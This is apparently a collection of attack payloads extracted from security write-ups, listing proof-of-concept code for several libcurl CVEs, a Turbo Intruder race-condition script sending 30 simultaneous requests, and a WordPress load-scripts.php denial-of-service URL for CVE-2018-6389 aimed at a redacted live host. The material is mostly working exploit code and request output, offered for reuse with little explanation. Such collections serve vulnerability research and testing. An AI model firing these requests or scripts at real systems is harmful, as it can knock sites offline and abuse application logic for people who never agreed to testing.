# Payloads — misc

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Race condition in joining CTF group
- Source: `telegram writeups (verbatim excerpts)`

```
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=100,
                           pipeline=True
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

## 2. CVE-2023-28322
- Source: `telegram writeups (verbatim excerpts)`

```
CURL *curl = curl_easy_init();
if(curl) {
  const char *data = "data to send";
 
  curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
 
  /* size of the POST data */
  curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, 12L);
 
  /* pass in a pointer to the data - libcurl will not copy */
  curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
 
  curl_easy_perform(curl);
}
```

## 3. CVE-2023-28322
- Source: `telegram writeups (verbatim excerpts)`

```
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

typedef struct
{
    char *buf;
    size_t len;
} put_buffer;

static size_t put_callback(char *ptr, size_t size, size_t nmemb, void *stream)
{
    put_buffer *putdata = (put_buffer *)stream;
    size_t totalsize = size * nmemb;
    size_t tocopy = (putdata->len < totalsize) ? putdata->len : totalsize;
    memcpy(ptr, putdata->buf, tocopy);
    putdata->len -= tocopy;
    putdata->buf += tocopy;
    return tocopy;
}

int main()
{
    CURL *curl = NULL;
    put_buffer pbuf = {};
    char *otherdata = "This is some other data";

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();

    // PUT
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, put_callback);
    pbuf.buf = strdup("This is highly secret and sensitive data");
    pbuf.len = strlen(pbuf.buf);
    curl_easy_setopt(curl, CURLOPT_READDATA, &pbuf);
    curl_easy_setopt(curl, CURLOPT_INFILESIZE, pbuf.len);
    curl_easy_setopt(curl, CURLOPT_URL, "http://host1.com/putsecretdata");
    curl_easy_perform(curl);

    // Without this line, a PUT instead of a POST will be sent below (this is a bug in libcurl)
    //curl_easy_setopt(curl, CURLOPT_UPLOAD, 0L);

    // Without this line, the POST below will send "This is highly secret and sensitive data"
    //    when instead the user intended to send "This is some other data"
    // With this line, the program will attempt to use freed data, causing a segfault or any number
    //    of potential exploits.
    //free(pbuf.buf);

    // POST (will be a PUT without the line just above)
    //curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, otherdata);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(otherdata));
    curl_easy_setopt(curl, CURLOPT_URL, "http://host2.com/postotherdata");
    curl_easy_perform(curl);

    curl_easy_cleanup(curl);

    curl_global_cleanup();

    return 0;
}
```

## 4. CVE-2018-6389 exploitation - using scripts loader
- Source: `telegram writeups (verbatim excerpts)`

```
eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```

## 5. CVE-2023-27537
- Source: `telegram writeups (verbatim excerpts)`

```
<?php
$random = rand(0, 1);
if($random == 0){
        header("strict-transport-security: max-age=9999");
}else{
        header("strict-transport-security: max-age=0");
}
```

## 6. CVE-2023-27537
- Source: `telegram writeups (verbatim excerpts)`

```
#include <stdio.h>
#define HAVE_STRUCT_TIMESPEC // [Add] 
#include <pthread.h>
#include <curl/curl.h>

#define NUMT 100

const char* const url = "https://test.local/poc.php";

pthread_mutex_t lock[9];

static void lock_cb(CURL* handle, curl_lock_data data,
    curl_lock_access access, void* userptr)
{
    pthread_mutex_lock(&lock[data]); /* uses a global lock array */
}

static void unlock_cb(CURL* handle, curl_lock_data data,
    void* userptr)
{
    pthread_mutex_unlock(&lock[data]); /* uses a global lock array */
}

static void* pull_one_url(void* shobject)
{
    CURL* curl;

    for (int i = 0; i < 100; i++) {
        curl = curl_easy_init();
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_HSTS, "c:\\home\\hsts.txt");
        curl_easy_setopt(curl, CURLOPT_SHARE, shobject);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_perform(curl); /* ignores error */
        curl_easy_cleanup(curl);
    }

    return NULL;
}

int main(int argc, char** argv)
{
    pthread_t tid[NUMT] = {0};
    int i;

    for(i = 0;i<=9;i++)
        pthread_mutex_init(&lock[i], NULL);
    
    /* Must initialize libcurl before any threads are started */
    curl_global_init(CURL_GLOBAL_ALL);
    CURLSH* shobject = curl_share_init();
    curl_share_setopt(shobject, CURLSHOPT_SHARE, CURL_LOCK_DATA_HSTS);
    curl_share_setopt(shobject, CURLSHOPT_LOCKFUNC, lock_cb);
    curl_share_setopt(shobject, CURLSHOPT_UNLOCKFUNC, unlock_cb);
    for (i = 0; i < NUMT; i++) {
        int error = pthread_create(&tid[i],
            NULL, /* default attributes please */
            pull_one_url,
            (void*)shobject);
        if (0 != error)
            fprintf(stderr, "Couldn't run thread number %d, errno %d\n", i, error);
        else
            fprintf(stderr, "Thread %d, gets %s\n", i, url);
    }

    /* now wait for all threads to terminate */
    for (i = 0; i < NUMT; i++) {
        pthread_join(tid[i], NULL);
        fprintf(stderr, "Thread %d terminated\n", i);
    }
    curl_share_cleanup(shobject);
    curl_global_cleanup();
    return 0;
}
```

## 7. DoS at  (CVE-2018-6389)
- Source: `telegram writeups (verbatim excerpts)`

```
https://████████/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
```

## 8. CVE-2022-43551
- Source: `telegram writeups (verbatim excerpts)`

```
C:\test\curl-7.86.0-win64-mingw\bin>curl -v --hsts hsts.txt http://accounts.google%E3%80%82com --head
*   Trying 142.250.206.237:80...
* Connected to accounts.google縲Ｄom (142.250.206.237) port 80 (#0)
> HEAD / HTTP/1.1
> Host: accounts.google.com
> User-Agent: curl/7.86.0
> Accept: */*
>
```

## 9. CVE-2022-32221
- Source: `telegram writeups (verbatim excerpts)`

```
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>

typedef struct
{
    char *buf;
    size_t len;
} put_buffer;

static size_t put_callback(char *ptr, size_t size, size_t nmemb, void *stream)
{
    put_buffer *putdata = (put_buffer *)stream;
    size_t totalsize = size * nmemb;
    size_t tocopy = (putdata->len < totalsize) ? putdata->len : totalsize;
    memcpy(ptr, putdata->buf, tocopy);
    putdata->len -= tocopy;
    putdata->buf += tocopy;
    return tocopy;
}

int main()
{
    CURL *curl = NULL;
    put_buffer pbuf = {};
    char *otherdata = "This is some other data";

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();

    // PUT
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, put_callback);
    pbuf.buf = strdup("This is highly secret and sensitive data");
    pbuf.len = strlen(pbuf.buf);
    curl_easy_setopt(curl, CURLOPT_READDATA, &pbuf);
    curl_easy_setopt(curl, CURLOPT_INFILESIZE, pbuf.len);
    curl_easy_setopt(curl, CURLOPT_URL, "http://host1.com/putsecretdata");
    curl_easy_perform(curl);

    // Without this line, a PUT instead of a POST will be sent below (this is a bug in libcurl)
    //curl_easy_setopt(curl, CURLOPT_UPLOAD, 0L);

    // Without this line, the POST below will send "This is highly secret and sensitive data"
    //    when instead the user intended to send "This is some other data"
    // With this line, the program will attempt to use freed data, causing a segfault or any number
    //    of potential exploits.
    //free(pbuf.buf);

    // POST (will be a PUT without the line just above)
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, otherdata);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(otherdata));
    curl_easy_setopt(curl, CURLOPT_URL, "http://host2.com/postotherdata");
    curl_easy_perform(curl);

    curl_easy_cleanup(curl);

    curl_global_cleanup();

    return 0;
}
```

## 10. CVE-2022-35252
- Source: `telegram writeups (verbatim excerpts)`

```
<?php
echo("HTTP/1.1 200 OK\r\nDate: Fri, 29 Apr 2022 10:11:55 GMT\r\nServer: Apache/2.4.43 (Debian)\r\nSet-Cookie: a=b\f; \r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
```

## 11. CVE-2022-35252
- Source: `telegram writeups (verbatim excerpts)`

```
curl -c cookies.txt http://127.0.0.1:3333
```

## 12. CVE-2022-35252
- Source: `telegram writeups (verbatim excerpts)`

```
➜  ~ xxd cookies.txt
00000000: 2320 4e65 7473 6361 7065 2048 5454 5020  # Netscape HTTP 
00000010: 436f 6f6b 6965 2046 696c 650a 2320 6874  Cookie File.# ht
00000020: 7470 733a 2f2f 6375 726c 2e73 652f 646f  tps://curl.se/do
00000030: 6373 2f68 7474 702d 636f 6f6b 6965 732e  cs/http-cookies.
00000040: 6874 6d6c 0a23 2054 6869 7320 6669 6c65  html.# This file
00000050: 2077 6173 2067 656e 6572 6174 6564 2062   was generated b
00000060: 7920 6c69 6263 7572 6c21 2045 6469 7420  y libcurl! Edit 
00000070: 6174 2079 6f75 7220 6f77 6e20 7269 736b  at your own risk
00000080: 2e0a 0a31 3237 2e30 2e30 2e31 0946 414c  ...127.0.0.1.FAL
00000090: 5345 092f 0946 414c 5345 0930 0961 0962  SE./.FALSE.0.a.b
000000a0: 0c0a                                     ..
```

## 13. CVE-2022-35252
- Source: `telegram writeups (verbatim excerpts)`

```
* Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1
> User-Agent: curl/7.83.1
> Accept: */*
> Cookie: a=b

> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Date: Tue, 21 Jun 2022 04:09:08 GMT
< Server: Apache/2.4.43 (Debian)
< Content-Length: 301
< Connection: close
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.43 (Debian) Server at 127.0.1.1 Port 80</address>
</body></html>
```
